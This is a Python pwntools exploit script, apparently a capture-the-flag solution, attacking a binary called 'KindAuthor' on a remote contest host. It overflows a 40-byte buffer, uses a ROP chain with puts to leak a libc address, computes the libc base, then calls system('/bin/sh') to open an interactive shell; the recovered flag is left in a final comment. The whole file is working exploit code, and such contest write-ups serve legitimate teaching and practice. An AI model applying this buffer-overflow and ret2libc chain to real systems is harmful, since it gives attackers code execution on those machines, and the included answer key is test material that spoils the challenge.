#!/usr/bin/env python3

from pwn import *

exe = ELF("./KindAuthor_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,"""
            b * func + 32
                       c
                       """)
    else:
        r = remote("ctf.mf.grsu.by", 9075)

    return r


def main():
    r = conn()
    e_rop = ROP(exe)

    r.recvuntil(b"data:")

    # trying to call puts(puts@got) to leak libc address
    payload = flat(
        "A" * 40,
        p64(e_rop.find_gadget(["pop rdi", "ret"])[0]),
        p64(exe.got["puts"]),  
        p64(exe.plt["puts"]),
        p64(exe.symbols["main"]),  
    )
    r.sendline(payload)
    
    output = r.recvuntil(b"data:")
    leak = int(output.split(b"Hello")[0].strip()[::-1].hex(), 16)
    log.info(f"Leaked address: {hex(leak)}")

    libc.address = leak - libc.symbols["puts"]
    log.info(f"Libc base address: {hex(libc.address)}")

    payload2 = flat(
        "A" * 40,
        p64(e_rop.find_gadget(["pop rdi", "ret"])[0]),  # pop rdi; ret
        p64(libc.search(b"/bin/sh").__next__()),  # address of "/bin/sh"
        p64(e_rop.find_gadget(["ret"])[0]),
        p64(libc.symbols["system"]),
    )
    r.sendline(payload2)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()


#  grodno{bL491M1_N4M3R3n1Y4m1_VYm05ch3n4_d0R094_v_5h3lL}